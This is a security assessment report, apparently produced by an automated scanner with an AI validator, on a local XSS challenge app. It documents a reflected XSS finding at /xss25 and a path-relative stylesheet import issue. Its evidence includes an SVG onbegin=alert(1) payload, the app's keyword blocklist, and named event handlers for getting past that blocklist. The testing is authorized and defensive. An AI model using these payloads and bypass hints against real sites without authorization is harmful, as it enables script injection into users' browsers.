# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-reflected Reflected XSS via unescaped HTML reflection in `solution` parameter (/xss25)](#finding-1)
    - [2. INFO — burp Path-relative style sheet import (2 URLs)](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxcp3a2-130opz` |
| Target | http://target.local:32783/ |
| Started | 2026-06-28T05:31:00.925Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 2 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32783`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

2 finding(s): 1 medium, 1 info

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-reflected] Reflected XSS via unescaped HTML reflection in `solution` parameter (/xss25)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32783/

The POST `solution` parameter on /xss25 is reflected into the HTML response without output encoding, directly after the `<input>` element (sink: `placeholder="Enter solution..." > {solution}>`). User-supplied HTML tags are emitted raw into the document. The application applies a keyword-based blocklist that rejects payloads containing `script`, `onload`, `onerror`, `onbegin` (returning a "Sorry you can't use: '<kw>'" page with no reflection), but the filter is incomplete and bypassable: any tag/attribute not on the blocklist (e.g. `<b>`, and numerous event handlers/SVG vectors such as ontoggle/onpointerover/onfocus/animate variants not enumerated) is injected unescaped, enabling cross-site scripting. NEGATIVE CONTROL ev-mqxcw65r-e: a blocked payload (onbegin) is filtered, no HTML reflected, body length 828. POSITIVE REPLAYS ev-mqxcw42v-c and ev-mqxcw5x0-d: the literal `<b>pwnVERDICTxss</b>` is reflected unescaped into the HTML, body length 1021, stable across replays.

**Reproduction**

```
1. POST to http://target.local:32783/xss25 with header `Content-Type: application/x-www-form-urlencoded` and body `solution=<b>pwnVERDICTxss</b>` (URL-encoded).
2. Observe the response HTML contains the literal unescaped tag: `<input type=text name=solution placeholder="Enter solution..." > <b>pwnVERDICTxss</b>>` — the `<b>` is rendered as markup, not text.
3. Negative control: POST `solution=<...onbegin...>` (a blocklisted keyword) → response is the "Sorry you can't use: 'onbegin'" page with no reflection (length 828), proving the difference is the injected HTML, not a generic echo.
4. Because the blocklist only covers a few keywords (script/onload/onerror/onbegin), an attacker selects a non-listed execution vector to achieve JavaScript execution in the victim's browser.
```

**Evidence**

- Evidence `ev-mqxcw65r-e` — `artifacts/s-0001/ev-mqxcw65r-e/`

Request:

```http
POST /xss25 HTTP/1.1
Host: target.local:32783
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=%3Csvg%3E%3Canimate%20onbegin%3Dalert(1)%20attributeName%3Dx%20dur%3D1s%3E%3C%2Fsvg%3EzzANI
```

Response:

```http
HTTP/1.1 200
content-length: 828
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:36:30 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss25.css">
            <title>Dalgona - Star</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text">Sorry you can't use: 'onbegin'</div>
                    
                    <input type=text name=solution placeholder="Enter solution..." >>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxcw42v-c` — `artifacts/s-0001/ev-mqxcw42v-c/`

Request:

```http
POST /xss25 HTTP/1.1
Host: target.local:32783
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=%3Cb%3EpwnVERDICTxss%3C%2Fb%3E
```

Response:

```http
HTTP/1.1 200
content-length: 1021
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:36:28 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss25.css">
            <title>Dalgona - Star</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." > <b>pwnVERDICTxss</b>>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxcw5x0-d` — `artifacts/s-0001/ev-mqxcw5x0-d/`

Request:

```http
POST /xss25 HTTP/1.1
Host: target.local:32783
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

solution=%3Cb%3EpwnVERDICTxss%3C%2Fb%3E
```

Response:

```http
HTTP/1.1 200
content-length: 1021
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:36:30 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss25.css">
            <title>Dalgona - Star</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." > <b>pwnVERDICTxss</b>>
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32783/xss25] @ http://target.local:32783/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxd7v2f-r` — `artifacts/_/ev-mqxd7v2f-r/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32783

GET / HTTP/1.1
Host: target.local:32783
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1093
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sun, 28 Jun 2026 05:43:26 GMT


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="xss25"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">XSS 25</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
